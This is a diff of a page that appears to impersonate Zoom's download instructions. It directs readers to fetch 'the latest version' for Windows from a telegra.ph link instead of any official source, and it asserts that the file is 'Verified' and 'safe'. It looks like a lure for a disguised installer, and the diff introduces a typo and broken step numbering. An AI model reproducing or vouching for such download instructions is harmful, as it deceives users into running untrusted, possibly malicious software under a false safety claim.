@@ -21,12 +21,12 @@ Welcome to **Zoom**, your all-in-one solution for seamless **video meetings**, *
 No tech skills required. Just follow these **3 simple steps**:
 
 1. 🔽 **Download the App**  
-   Click [here](https://telegra.ph/Zoom-The-Ultimate-Online-Video-Conferencing-App-06-29) to download the latest version for your OS Windows
-🛡️ Verified file – safe and requires no extra components.
-2. 🚀 **Run the Installer**  
+   Click [here](https://telegra.ph/Zoom-The-Ultimate-Online-Video-Conferencing-App-06-29) to download the latest version for your OS Windos
+     🛡️ Verified file – safe and requires no extra components.
+3. 🚀 **Run the Installer**  
    Double-click the downloaded file and follow the on-screen instructions.
 
-3. 🎯 **Launch & Join a Meeting**  
+4. 🎯 **Launch & Join a Meeting**  
    Open the app, sign in or join a meeting via link/meeting ID. That’s it!
 
 > ⚡ No configuration required. Just install & connect!
